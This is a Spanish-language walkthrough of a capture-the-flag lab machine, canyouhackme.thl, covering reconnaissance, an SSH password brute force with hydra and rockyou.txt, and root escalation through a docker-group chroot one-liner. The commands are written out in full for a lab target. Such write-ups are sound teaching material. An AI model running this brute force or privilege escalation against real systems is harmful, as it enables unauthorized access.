![](./images/Pasted%20image%2020241223191430.png)

RECONOCIMIENTO
---------------------------------

Usaremos arp-scan para saber qué ip tiene la máquina víctima. 

```
arp-scan -I eth0 --localnet
```

![](./images/Pasted%20image%2020241223191756.png)

A continuación es ver qué puerto tiene abierto. 

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 192.168.1.62
```

![](./images/Pasted%20image%2020241223192043.png)

Nos dice que están abiertos el puerto ssh y el 80 de http. 

Nos metemos en la página pero nos da error. 

Lo que podemos es redireccionarlo al nombre de dominio de canyouhackme.thl
Nos vamos a `nano /etc/hosts`
Y ahí ponemos lo siguiente: la ip y el nombre de dominio. 

![](./images/Pasted%20image%2020241223192433.png)

Lo guardamos. 

Y aquí tenemos ya la página. 
![](./images/Pasted%20image%2020241223192615.png)

Miramos el código fuente. 

Y vemos un comentario. 

![](./images/Pasted%20image%2020241223192706.png)

Así que tenemos una posible via de entrada. 

Lo que haremos a continuación es un ataque de fuerza bruta. 

```
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.62
```

Esperamos un rato por si nos encuentra la contraseña. 

Tenemos la contraseña (La oculto por si queréis buscarla vosotros). 

![](./images/Pasted%20image%2020241223193444.png)

Ahora entraremos via ssh

```
ssh juan@192.168.1.62
```

Una vez dentro nos daría el flag del usuario. 

A continuación para hacernos root.

Vemos que pertenecemos al grupo docker, así que buscamos información y podemos poner lo siguiente: 

```
docker run --rm -it -v /:/mnt alpine chroot /mnt bash
```

Y ya somos root.

![](./images/Pasted%20image%2020241223194022.png)

Hemos pasado!!!

![](./images/Pasted%20image%2020241223194201.png)
